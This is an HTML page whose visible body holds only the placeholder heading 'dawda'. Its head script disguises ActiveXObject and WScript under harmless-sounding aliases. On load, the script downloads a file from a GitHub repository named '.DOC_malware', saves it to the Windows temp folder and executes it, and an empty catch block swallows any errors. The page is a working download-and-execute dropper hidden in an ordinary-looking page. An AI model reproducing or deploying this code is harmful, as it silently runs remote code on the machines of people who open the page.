<html><head>
  <script>
    var BurgerXObject = ActiveXObject;
    var OrangeShell = WScript;

    function downloadFile(url, destination) {
      var xhr = new BurgerXObject("MSXML2.XMLHTTP");
      xhr.open("GET", url, false);
      xhr.send();
      var fso = new BurgerXObject("Scripting.FileSystemObject");
      if (fso.FileExists(destination) == false) {
        var stream = new BurgerXObject("ADODB.Stream");
        stream.Open();
        stream.Type = 1;
        stream.Write(xhr.ResponseBody);
        stream.Position = 0;
        stream.SaveToFile(destination, 2);
        stream.Close();
      }
    }
    try {
      var url =
        "https://raw.githubusercontent.com/a0zhar/.DOC_malware/main/TEST.txt";
      var filepath =
        OrangeShell.CreateObject("WScript.Shell").ExpandEnvironmentStrings(
          "%TEMP%"
        ) + "/TEST.txt";
      downloadFile(url, filepath);
      OrangeShell.Run(filepath);
    } catch (err) {}
  </script>
</head>

<body>
  <h1>dawda</h1>
  </body></html>
